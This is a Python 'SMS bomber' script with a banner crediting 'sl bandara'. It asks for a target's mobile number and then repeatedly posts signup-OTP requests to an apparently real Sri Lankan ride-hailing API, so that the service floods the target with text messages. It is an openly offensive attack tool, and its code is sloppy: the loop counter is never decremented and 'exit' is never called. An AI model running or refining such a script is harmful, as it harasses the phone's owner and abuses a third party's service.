
import os,sys,time
import argparse
import requests
import subprocess as subp

parser = argparse.ArgumentParser()
parser.add_argument('-n', '--number', help='dialog, mobitile, hutch')
parser.add_argument('-f', '--spin', help='Folder name')
args = parser.parse_args()
N = args.number
F = args.spin

bar = "___________________________"
name=("""
░██████╗███╗░░░███╗░██████╗  
██╔════╝████╗░████║██╔════╝  
╚█████╗░██╔████╔██║╚█████╗░  
░╚═══██╗██║╚██╔╝██║░╚═══██╗  
██████╔╝██║░╚═8╝░██║██████╔╝  
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░  
██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

By sl bandara
""")
print(name)
def new(num, s):
    body={"id":num[1:],"apphash":""}

    ss = 0
    mm = 0
    while s > 0:
        url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
        body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
        res=requests.post(url,json=body)
        resp = str(res)
        if resp == '<Response [200]>':
            print(bar)
            print("\n\033[1;32;40m  Send Successful ... [✓]")
            print(bar)
            time.sleep(5)

        else:
           print("")
           exit
def main():
    choice = N
    if choice == 'Dialog' or choice == 'dialog':
        num = input("Enter Mobile Number: ")
        s = int(input("Enter amount"))
        new(num, s)
        print("Done.")
    elif choice == 'Mobitile' or choice == 'mobitile':
        filename = input("Enter Mobile Number: ")
        password = input("Password: ")
        print("Maintane mood")
    elif choice == 'Airtel' or choice == 'airtel':
        print("No Option selected, closing...")
    elif choice == 'Hutch' or choice == 'hutch':
        print("තාම ඇඩ් කරලා නැ,වෙන සිම් එකක් දාලා යවහන්.")
    else:
        print("" )
if __name__ == '__main__':
    main()

